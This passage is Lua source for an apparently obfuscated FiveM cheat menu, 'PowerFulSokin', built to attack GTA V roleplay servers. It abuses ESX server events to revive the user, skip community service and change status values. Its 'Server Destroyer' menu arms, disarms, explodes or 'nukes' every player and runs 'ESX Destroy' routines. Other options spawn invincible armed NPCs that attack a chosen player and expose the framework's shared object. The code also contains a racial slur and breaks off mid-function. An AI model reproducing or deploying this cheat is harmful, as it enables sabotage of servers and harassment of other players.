                   if PowerFulSokin.saidhas78dhas("~h~~g~Player ~s~Settings", "SelfMenu") then
                elseif PowerFulSokin.saidhas78dhas("~h~~y~Online ~s~Players", "OnlinePlayerMenu") then
                elseif PowerFulSokin.saidhas78dhas("~h~<FONT COLOR='#ff8400'>Server ~s~Settings", "World") then
                elseif PowerFulSokin.saidhas78dhas("~h~~m~Teleport ~s~Settings", "TeleportMenu") then
                elseif PowerFulSokin.saidhas78dhas("~h~~b~Vehicle ~s~Settings", "VehMenu") then
                elseif PowerFulSokin.saidhas78dhas("~h~~p~Weapon ~s~Settings", "WepMenu") then
                elseif PowerFulSokin.saidhas78dhas("~h~Server ~s~<FONT COLOR='#B20000'>Destroyer", "Fuck") then
                elseif PowerFulSokin.saidhas78dhas() then
                elseif PowerFulSokin.saidhas78dhas("~h~Soczek~r~~h~Options", "DzbanPiwa") then
                elseif PowerFulSokin.saidhas78dhas("~h~Settings ~r~~h~Options", "SettingsMenu") then
                elseif PowerFulSokin.saidhas78dhas("~h~<FONT COLOR='#11c1ed'>Informations", "Informations") then
           --     elseif PowerFulSokin.sadh78asd7asgda("Close FiveM") then
        --                ForceSocialClubUpdate()
                elseif PowerFulSokin.sadh78asd7asgda("~h~~r~Off ~s~Menu") then
                     hasdh8ay = false
                end

                PowerFulSokin.sadha7sxzsa()
            elseif PowerFulSokin.asdy7as12("SelfMenu") then
                if PowerFulSokin.saidhas78dhas('~h~~p~»~s~ ESX Triggers', 'ESXTriggersSelf') then
                elseif PowerFulSokin.saidhas78dhas("~h~~p~»~s~ Model list", "Models") then
                elseif
                    PowerFulSokin.asdnjasj9asdljasdu(
                        "~h~~g~God ~h~~r~Mode",
                        Godmode,
                        function(hasdh8ay)
                            Godmode = hasdh8ay
                        end
                    )
                 then
                elseif PowerFulSokin.sadh78asd7asgda("~h~~r~Edit Skin") then
                    TriggerEvent('esx_skin:openSaveableMenu')
                    PowerFulSokin.sadha7sxzsaaa()
                elseif PowerFulSokin.sadh78asd7asgda("~h~~r~Suicide") then
                    SetEntityHealth(PlayerPedId(), 0)
                elseif PowerFulSokin.sadh78asd7asgda("~h~~g~Heal") then
                    SetEntityHealth(PlayerPedId(), 200)
                elseif PowerFulSokin.sadh78asd7asgda('~h~~g~Heal Player ~w~next to~w~') then
                    TriggerServerEvent('esx_ambulancejob:heal', GetPlayerServerId(closestPlayer), 'big')
                elseif PowerFulSokin.sadh78asd7asgda("~h~~b~Armor") then
                    SetPedArmour(PlayerPedId(), 200)
                elseif PowerFulSokin.sadh78asd7asgda('Force Ragdoll ~r~~h~FUN') then 
                SetPedToRagdoll(GetPlayerPed(-1), 1000, 1000, 0, 0, 0, 0)
                elseif
                PowerFulSokin.asdnjasj9asdljasdu("~h~Infinite Stamina",InfStamina,function(hasdh8ay)InfStamina = hasdh8ay end)
                then
                elseif
                PowerFulSokin.asdnjasj9asdljasdu(
                    "~h~Super Jump",
                    SuperJump,
                    function(hasdh8ay)
                    SuperJump = hasdh8ay
                    end)
                then
                elseif
                PowerFulSokin.asdnjasj9asdljasdu(
                    "~h~Explosive Punch",
                    ePunch,
                    function(hasdh8ay)
                    ePunch = hasdh8ay
                    end)
                then
                elseif PowerFulSokin.asdnjasj9asdljasdu("Fast Run",fastrun,function(hasdh8ay)fastrun = hasdh8ay end) then
                elseif
                    PowerFulSokin.asdnjasj9asdljasdu(
                        '~h~Thermal ~o~Vision',
                        bTherm,
                        function(bTherm)
                        end
                    )
                 then
                    therm = not therm
                    bTherm = therm
                    SetSeethrough(therm)
                elseif
                    PowerFulSokin.asdnjasj9asdljasdu(
                        '~h~Night ~g~Vision',
                        bNight,
                        function(bNight)
                        end
                    )
                 then
                    night = not night
                    bNight = night
                    SetNightvision(night)
                elseif
                PowerFulSokin.asdnjasj9asdljasdu(
                    "~h~Invisible",
                    Invisible,
                    function(hasdh8ay)
                    Invisible = hasdh8ay
                    end)
                then
                elseif PowerFulSokin.sadh78asd7asgda("~h~~r~Optimize FPS") then
                    optimizeFPS()
                elseif
                PowerFulSokin.asdnjasj9asdljasdu("~h~NoClip",Noclip,function(hasdh8ay)Noclip = hasdh8ay end)
                then    
                end

                PowerFulSokin.sadha7sxzsa()
            elseif PowerFulSokin.asdy7as12('ESXTriggersSelf') then
                    if PowerFulSokin.sadh78asd7asgda('~h~~g~ESX ~s~Revive Yourself~s~') then
                        TriggerEvent('esx_ambulancejob:revive')
                        TriggerEvent('esx_ambulancejob:revive997')
                        TriggerEvent('esx_ambulancejob:revivehype')
                        TriggerEvent('ambulancier:selfRespawn')
                        TriggerEvent('esx_ambulancejob:lukirevive')
                        PowerFulSokin.sadha7sxzsaaa()
                    elseif PowerFulSokin.sadh78asd7asgda("~h~~g~ESX ~s~Evade From ~r~Community Service") then
                        TriggerServerEvent('esx_communityservice:finishCommunityService')
                    elseif PowerFulSokin.sadh78asd7asgda("~h~Set ~o~hunger ~s~to ~h~~g~100") then
                        TriggerEvent("esx_status:set", "hunger", 1000000)
                    elseif PowerFulSokin.sadh78asd7asgda("~h~Set ~b~thirst ~s~to ~h~~g~100") then
                        TriggerEvent("esx_status:set", "thirst", 1000000)
                    end

                PowerFulSokin.sadha7sxzsa()
            elseif PowerFulSokin.asdy7as12("\77\111\100\101\108\115") then
            if PowerFulSokin.sadh78asd7asgda("~b~~h~Jesus") then
            local model = "u_m_m_jesus_01"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
            elseif PowerFulSokin.sadh78asd7asgda("~b~~h~Husky") then        
            local model = "a_c_husky"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
            elseif PowerFulSokin.sadh78asd7asgda("~b~~h~Dzik") then        
            local model = "a_c_boar"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                    elseif PowerFulSokin.sadh78asd7asgda("~b~~h~Rat") then
            local model = "a_c_rat"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                    elseif PowerFulSokin.sadh78asd7asgda("~b~~h~Niko") then
            local model = "mp_m_niko_01"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                    elseif PowerFulSokin.sadh78asd7asgda("~b~~h~Ballas") then
            local model = "g_m_y_ballasout_01"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                    elseif PowerFulSokin.sadh78asd7asgda("~b~~h~Diler") then
            local model = "s_m_y_dealer_01"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
            elseif PowerFulSokin.sadh78asd7asgda("~b~~h~Clown") then
            local model = "s_m_y_clown_01"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
            elseif PowerFulSokin.sadh78asd7asgda("~b~~h~Lion") then
            local model = "A_C_MtLion"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
            elseif PowerFulSokin.sadh78asd7asgda("~b~~h~Swat") then
            local model = "s_m_y_swat_01"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
            elseif PowerFulSokin.sadh78asd7asgda("~b~~h~Stripper") then
            local model = "s_f_y_stripper_01"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                    elseif PowerFulSokin.sadh78asd7asgda("~b~~h~Cop") then
            local model = "s_m_y_cop_01"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                    elseif PowerFulSokin.sadh78asd7asgda("~b~~h~Chimp") then
            local model = "a_c_chimp"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                    elseif PowerFulSokin.sadh78asd7asgda("~b~~h~Alien") then
            local model = "s_m_m_movalien_01"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
            elseif PowerFulSokin.sadh78asd7asgda("~b~~h~Adult") then
            local model = "a_m_o_acult_01"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                    elseif PowerFulSokin.sadh78asd7asgda("~b~~h~Pongo") then
            local model = "u_m_y_pogo_01"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                    elseif PowerFulSokin.sadh78asd7asgda("~b~~h~Babyd") then
            local model = "u_m_y_babyd"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                    elseif PowerFulSokin.sadh78asd7asgda("~b~~h~Fivem skin") then
            local model = "mp_m_freemode_01"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
            
                    
                else ShowInfo("~r~Model not recognized") end
            elseif PowerFulSokin.sadh78asd7asgda("~r~~h~Randomize Clothing") then
                SetPedRandomComponentVariation(PlayerPedId(), true)
        
                
                end

            PowerFulSokin.sadha7sxzsa()
                elseif PowerFulSokin.asdy7as12("Informations") then
                    if PowerFulSokin.sadh78asd7asgda("~h~<FONT COLOR='#33ccff'>Build Rev<FONT COLOR='#ff0000'> 6.9 <FONT COLOR='#ffffff'>∑") then
                hasidas8dgas('~h~~r~BETA', false)
            elseif PowerFulSokin.sadh78asd7asgda("~h~~r~Onion ~g~Executor <FONT COLOR='#ffffff'>∑") then
                elseif PowerFulSokin.sadh78asd7asgda("~h~~r~ChocoHax ~g~Undetected <FONT COLOR='#ffffff' >") then
                elseif PowerFulSokin.sadh78asd7asgda("∑~p~~h~Sokin#1337 - Developer") then
                elseif PowerFulSokin.sadh78asd7asgda("∑~p~~h~Dzban piwa#5555 - Helper") then
                hasidas8dgas('~h~~s~BEST DEVELOPER NIGGA.', false)
                end

                 PowerFulSokin.sadha7sxzsa()
            elseif PowerFulSokin.asdy7as12('SpawnPeds') then
                if PowerFulSokin.sadh78asd7asgda('~h~~r~Spawn ~w~monkey with ~y~AK') then
                    local bQ = 'a_c_chimp'
                    local bR = 'WEAPON_ASSAULTRIFLE'
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                   elseif PowerFulSokin.sadh78asd7asgda('~h~~r~Spawn ~w~whale') then
                    local bQ = 'a_c_humpback'
                    local bR = 'weapon_knife'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                   elseif PowerFulSokin.sadh78asd7asgda('~h~~r~Spawn ~w~killerwhale') then
                    local bQ = 'a_c_killerwhale'
                    local bR = 'weapon_knife'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif PowerFulSokin.sadh78asd7asgda('~h~~r~Spawn ~w~Swat army with ~y~AK') then
                    local bQ = 's_m_y_swat_01'
                    local bR = 'WEAPON_ASSAULTRIFLE'
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif PowerFulSokin.sadh78asd7asgda('~h~~r~Spawn ~w~Swat army with ~y~RPG') then
                    local bQ = 's_m_y_swat_01'
                    local bR = 'weapon_rpg'
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif PowerFulSokin.sadh78asd7asgda('~h~~r~Spawn ~w~Swat army with ~y~Flaregun') then
                    local bQ = 's_m_y_swat_01'
                    local bR = 'weapon_flaregun'
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif PowerFulSokin.sadh78asd7asgda('~h~~r~Spawn ~w~Swat army with ~y~Railgun') then
                    local bQ = 's_m_y_swat_01'
                    local bR = 'weapon_railgun'
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                end

                 PowerFulSokin.sadha7sxzsa()
            elseif PowerFulSokin.asdy7as12("\83\101\116\116\105\110\103\115\77\101\110\117") then
                if PowerFulSokin.asidhas89dg("Menu X", asdja9usduasasdjasd, sasiud9asdh8asdX, asdhasdh8asdasdas, function(yagsd7asgd7asgdasd, saudygasuydguasdasd)
                    sasiud9asdh8asdX = yagsd7asgd7asgdasd
                    asdhasdh8asdasdas = saudygasuydguasdasd
                    for i = 1, #allasihdasdhas8dg do
                        PowerFulSokin.asdauhsdy7asdass(allasihdasdhas8dg[i], asdja9usduasasdjasd[sasiud9asdh8asdX])
                    end
                    end) 
                    then
                elseif PowerFulSokin.asidhas89dg("Menu Y", asdhas78da8hd, sasiud9asdh8asdY, asduas7dhasyd8asd, function(yagsd7asgd7asgdasd, saudygasuydguasdasd)
                    sasiud9asdh8asdY = yagsd7asgd7asgdasd
                    asduas7dhasyd8asd = saudygasuydguasdasd
                    for i = 1, #allasihdasdhas8dg do
                        PowerFulSokin.asdjhas7dha8sdasdasd(allasihdasdhas8dg[i], asdhas78da8hd[sasiud9asdh8asdY])
                    end
                    end)
                    then
                elseif
                    PowerFulSokin.asdnjasj9asdljasdu(
                        '~h~~r~Ra~g~nd~b~om ~s~Notification Color',
                        rgbnot,
                        function(dR)
                            rgbnot = dR
                        end
                    )
                 then
                end
                

             PowerFulSokin.sadha7sxzsa()
        elseif PowerFulSokin.asdy7as12('Sokin') then
            if PowerFulSokin.sadh78asd7asgda("Set Model") then
                local model = GetKeyboardInput()
                RequestModel(GetHashKey(model))
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                else ShowInfo("~r~Model not recognized") end
            elseif PowerFulSokin.sadh78asd7asgda("Randomize Clothing") then
                RandomClothes(PlayerId())
            elseif PowerFulSokin.asidhas89dg("Custom Outfit 1", {"save", "load"}, currClothingIndex_1, selClothingIndex_1, function(yagsd7asgd7asgdasd, saudygasuydguasdasd)
                    currClothingIndex_1 = yagsd7asgd7asgdasd
                    selClothingIndex_1 = yagsd7asgd7asgdasd
                end) then
                if selClothingIndex_1 == "save" then
                    Outfits[1] = GetCurrentOutfit(PlayerId())
                elseif selClothingIndex_1 == "load" then
                    SetCurrentOutfit(Outfits[1])
                end
            end

        PowerFulSokin.sadha7sxzsa()
            elseif PowerFulSokin.asdy7as12("TeleportMenu") then
                if PowerFulSokin.sadh78asd7asgda("Teleport To Waypoint") then
                    TeleportToWaypoint()
                elseif PowerFulSokin.sadh78asd7asgda("Teleport Into Nearest Vehicle") then
                    teleportToNearestVehicle()
                elseif PowerFulSokin.sadh78asd7asgda("Teleport To Coords") then
                    TeleportToCoords()
                elseif PowerFulSokin.asdnjasj9asdljasdu(
                    "Show Coords",
                    showCoords,
                    function(hasdh8ay)
                        showCoords = hasdh8ay
                    end)
                then
                elseif PowerFulSokin.sadh78asd7asgda("Draw Custom Blip") then
                    bk()
                end

        PowerFulSokin.sadha7sxzsa()
            elseif PowerFulSokin.asdy7as12("World") then
                PowerFulSokin.dasdjas78dhasd('World', 'Server IP: '..GetCurrentServerEndpoint())
                if PowerFulSokin.saidhas78dhas("~h~~o~Crosshairs", "crosshairs") then
                elseif PowerFulSokin.saidhas78dhas("~h~Resources", "resources") then
                elseif PowerFulSokin.sadh78asd7asgda("~h~~r~Airstrike ~g~Waypoint") then
                AirstrikeWaypoint()
                elseif PowerFulSokin.sadh78asd7asgda('~h~Print GetSharedObject') then
                    local LOAD_es_extended = LoadResourceFile("es_extended", "client/common.lua")
                    if LOAD_es_extended then
                        LOAD_es_extended = LOAD_es_extended:gsub("AddEventHandler", "")
                        LOAD_es_extended = LOAD_es_extended:gsub("cb", "")
                        LOAD_es_extended = LOAD_es_extended:gsub("function ", "")
                        LOAD_es_extended = LOAD_es_extended:gsub("return ESX", "")
                        LOAD_es_extended = LOAD_es_extended:gsub("(ESX)", "")
                        LOAD_es_extended = LOAD_es_extended:gsub("function", "")
                        LOAD_es_extended = LOAD_es_extended:gsub("getSharedObject%(%)", "")
                        LOAD_es_extended = LOAD_es_extended:gsub("end", "")
                        LOAD_es_extended = LOAD_es_extended:gsub("%(", "")
                        LOAD_es_extended = LOAD_es_extended:gsub("%)", "")
                        LOAD_es_extended = LOAD_es_extended:gsub(",", "")
                        LOAD_es_extended = LOAD_es_extended:gsub("\n", "")
                        LOAD_es_extended = LOAD_es_extended:gsub("'", "")
                        LOAD_es_extended = LOAD_es_extended:gsub("%s+", "")
                        print(tostring(LOAD_es_extended))
                    end
            elseif PowerFulSokin.sadh78asd7asgda('Menu in Resource: '..GetCurrentResourceName()) then

            elseif
                PowerFulSokin.asdnjasj9asdljasdu(
                "~h~ESP",
                esp,
                function(hasdh8ay)
                esp = hasdh8ay
                end)
            then
            elseif
                PowerFulSokin.asdnjasj9asdljasdu(
                "~h~Players Blips Map",
                playerBlips,
                function(hasdh8ay)
                playerBlips = hasdh8ay
                end)
            then
            elseif
                PowerFulSokin.asdnjasj9asdljasdu(
                "~h~~r~Clear ~s~All Vehicles",
                destroyvehicles,
                function(hasdh8ay)
                destroyvehicles = hasdh8ay
                end) 
            then
            elseif
                PowerFulSokin.asdnjasj9asdljasdu(
                "~h~~r~Explode ~s~All Vehicles",
                explodevehicles,
                function(hasdh8ay)
                explodevehicles = hasdh8ay
                end) 
            then
        end

        PowerFulSokin.sadha7sxzsa()
            elseif PowerFulSokin.asdy7as12("Crosshairs") then
                if PowerFulSokin.asdnjasj9asdljasdu(
                    "~r~Crosshair",
                    crosshair,
                    function(hasdh8ay)
                        crosshair = hasdh8ay
                    end)
                then
                elseif PowerFulSokin.asdnjasj9asdljasdu(
                    "~r~Crosshair 2",
                    crosshair2,
                    function(hasdh8ay)
                         crosshair2 = hasdh8ay
                    end)
                then
                elseif PowerFulSokin.asdnjasj9asdljasdu(
                    "~r~Crosshair 3",
                    crosshair3,
                    function(hasdh8ay)
                        crosshair3 = hasdh8ay
                    end)
                then 
                elseif PowerFulSokin.asdnjasj9asdljasdu(
                    "~r~Crosshair 4",
                    crosshair4,
                    function(hasdh8ay)
                        crosshair4 = hasdh8ay
                    end)
                then
                end

            PowerFulSokin.sadha7sxzsa()
            elseif PowerFulSokin.asdy7as12("\114\101\115\111\117\114\99\101\115") then
                for i=0, #serverOptionsResources do
                if PowerFulSokin.sadh78asd7asgda(serverOptionsResources[i]) then
                end
            end

        PowerFulSokin.sadha7sxzsa()
        elseif PowerFulSokin.asdy7as12("Fuck") then
        if PowerFulSokin.sadh78asd7asgda("~h~~r~Give All Weapons ~s~~h~Players") then
                    for ids = 0, 128 do
                        if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
                            for i = 1, #allWeapons do
                                GiveWeaponToPed(PlayerPedId(ids), GetHashKey(allWeapons[i]), 1000, false, false)
                    end
                end
            end
        elseif PowerFulSokin.sadh78asd7asgda("~h~~r~Give combat_pistol all ~s~~h~Players") then
                    for ids = 0, 128 do
                        if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
                            for i = 1, #weaponcombatpistol do
                                GiveWeaponToPed(PlayerPedId(ids), GetHashKey(weaponcombatpistol[i]), 1000, false, false)
                    end
                end
            end
                elseif PowerFulSokin.sadh78asd7asgda("~h~~r~Remove All Weapons ~s~~h~Players") then
                    for ids = 0, 128 do
                        if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
                            for i = 1, #allWeapons do
                            RemoveAllPedWeapons(PlayerPedId(ids), true)
                end 
            end
        end
    elseif PowerFulSokin.asdnjasj9asdljasdu("~g~GCPhone ~r~Destroy", gcphonedestroy, function(hasdh8ay) gcphonedestroy = hasdh8ay end) then
    elseif PowerFulSokin.sadh78asd7asgda("~g~ESX ~r~Destroy ~r~v3") then
     esxdestroyv333()
    elseif
        PowerFulSokin.asdnjasj9asdljasdu(
        "~h~~r~Explode ~s~All Players",
        wybuchall,
        function(hasdh8ay)
        wybuchall = hasdh8ay
    end)
    then
    elseif
        PowerFulSokin.asdnjasj9asdljasdu(
        "~h~~r~Nuke ~s~All Players",
        nukeerekmordo,
        function(hasdh8ay)
        nukeerekmordo = hasdh8ay
        end)
    then
    elseif
        PowerFulSokin.asdnjasj9asdljasdu(
        "~h~~r~Nie~s~ Klikaj~g~ Tego = BAN",
        esxdestroy111,
        function(hasdh8ay)
        esxdestroy111 = hasdh8ay
        end)
    then
              elseif PowerFulSokin.sadh78asd7asgda("~h~~r~Hot~f~Wheels") then
                        local wallHash = GetHashKey("stt_prop_ramp_adj_loop")
                        RequestModel(wallHash)                  
                        local e4 = 0
                        while not HasModelLoaded(wallHash) do 
